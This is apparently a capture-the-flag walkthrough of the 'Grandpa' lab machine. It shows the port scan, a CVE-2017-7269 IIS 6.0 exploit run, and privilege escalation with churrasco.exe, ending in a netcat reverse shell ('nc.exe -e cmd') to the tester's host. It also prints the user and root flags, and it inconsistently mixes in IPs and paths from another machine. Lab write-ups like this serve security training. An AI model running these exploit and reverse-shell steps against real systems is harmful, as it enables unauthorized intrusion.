![Grandpa.PNG](/assets/Machines/Easy/Grandpa/Grandpa.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.14
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.14
```

**Output**
```bash
PORT   STATE SERVICE
80/tcp open  http
```

3. Search more information about web page
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─| nmap -sCV -p80 10.10.10.15 -oN version
```

**Output**
```bash
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Sat, 14 Jan 2023 17:16:16 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

In this case we can't upload any file, then we can search a exploit with IIS 6.0 [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)

4. Run the exploit with python2
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Grandpa]
└─| python2 iis.py 10.10.10.14 80 <Tun0 IP> 4444
```

**Output**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─| nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.15] 1032
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```


---
---
---
### **Privileges Escalation** 💀

1. Search information about Windows version

```bash
c:\windows\system32\inetsrv>systeminfo                                                                                                 
Host Name:GRANDPA
OS Name: Microsoft(R) Windows(R) Server 2003, Standard Edition
```

2. Search about privileges

```bash
c:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

3. Search for any exploit uses **SeImpersonatePrivilege** and **Windows Server 2003** [Exploit](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)

4. Download this executable and create again a **smbserver** and download in target machine.


* To download in target machine
```cmd
C:\WINDOWS\Temp\Exploit>copy \\10.10.14.29\Test\churrasco.exe churrasco.exe
```

5. Execute this exploit 
```bash
C:\WINDOWS\Temp\Exploit>.\churrasco.exe -d "whoami"

nt authority\system
```

6. Execute a commando to get a reverse shell how autority\system
```bash
C:\WINDOWS\Temp\Exploit>.\churrasco.exe -d "\\10.10.14.29\Test\nc.exe -e cmd 10.10.14.29 4444"
```

**Output**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─# rlwrap nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.15] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

7. Cat user and root flag
* User flag
```cmd
C:\Documents and Settings>type Harry\Desktop\user.txt
700c5dc163014e22b3e408f8703f67d1
```

* Root flag
```cmd
C:\Documents and Settings>type Administrator\Desktop\root.txt
aa4beed1c0584445ab463a6747bd06e9
```